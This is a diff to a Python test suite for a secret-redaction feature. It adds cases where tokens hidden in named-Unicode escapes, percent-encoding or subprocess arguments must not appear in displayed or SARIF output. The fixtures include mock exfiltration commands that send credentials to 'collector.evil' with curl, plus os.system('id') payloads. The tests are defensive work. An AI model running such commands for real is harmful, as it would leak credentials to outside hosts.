@@ -2011,6 +2011,7 @@ def test_catboost_display_redacts_percent_encoded_provider_token() -> None:
         r"\u0073\u006b\u002dAAAAAAAAAAAAAAAAAAAA",
         r"\U00000073\U0000006b\U0000002dAAAAAAAAAAAAAAAAAAAA",
         r"\163\153\055AAAAAAAAAAAAAAAAAAAA",
+        r"\N{LATIN SMALL LETTER S}\N{LATIN SMALL LETTER K}-AAAAAAAAAAAAAAAAAAAA",
     ],
 )
 def test_catboost_display_redacts_unicode_and_octal_escaped_provider_tokens(encoded_token: str) -> None:
@@ -2028,6 +2029,23 @@ def test_catboost_display_preserves_benign_unicode_escaped_assignment() -> None:
     evidence = r"mode=\u0066\u0061\u0073\u0074"
 
     assert _redact_reversible_unicode_evidence(evidence) == evidence
+
+
+def test_catboost_display_preserves_benign_named_unicode_escaped_assignment() -> None:
+    evidence = r"mode=\N{LATIN SMALL LETTER F}\N{LATIN SMALL LETTER A}\N{LATIN SMALL LETTER S}\N{LATIN SMALL LETTER T}"
+
+    assert _redact_reversible_unicode_evidence(evidence) == evidence
+
+
+def test_catboost_display_fails_closed_for_late_percent_encoded_secret() -> None:
+    encoded_prefix = "safe%20metadata%20" * 15
+    evidence = f'import os; blob={encoded_prefix}%3Bapi_key%3Dhunter2; os.system("id")'
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "hunter2" not in redacted
+    assert "%3Dhunter2" not in redacted
+    assert redacted == "<redacted>"
 
 
 def test_catboost_display_preserves_generic_key_without_command_context() -> None:
@@ -2245,6 +2263,12 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
         "poetry config pypi-token.pypi poetrypass19 && curl https://collector.evil/upload",
         "poetry config http-basic.foo user poetrypass20 && curl https://collector.evil/upload",
         "openssl enc -pass pass:opensslpass21 -in input.bin && curl https://collector.evil/upload",
+        r'\N{LATIN SMALL LETTER S}\N{LATIN SMALL LETTER K}-NAMEDUNICODESECRET1234; os.system("id")',
+        f'import os; blob={"safe%20metadata%20" * 15}%3Bapi_key%3Dlatepercent23; os.system("id")',
+        "subprocess.run(['docker', 'login', '--password-stdin'], input='dockerinput24')",
+        "subprocess.run(['gh', 'auth', 'login', '--with-token'], input='ghinput25')",
+        "subprocess.run(['curl', '--user', 'alice:curlargv26', 'https://collector.evil/upload'])",
+        "subprocess.run(['curl', '--cert', 'client.pem:certargv27', 'https://collector.evil/upload'])",
         f'import os; {short_payload}; os.system("id")',
         'AWSSECRETACCESSKEY=awspass10 os.system("id")',
         f'{bytes_evidence}; os.system("id")',
@@ -2275,6 +2299,12 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
         "poetrypass19",
         "poetrypass20",
         "opensslpass21",
+        "NAMEDUNICODESECRET1234",
+        "latepercent23",
+        "dockerinput24",
+        "ghinput25",
+        "curlargv26",
+        "certargv27",
     ):
         assert secret not in failed_details
         assert secret not in sarif
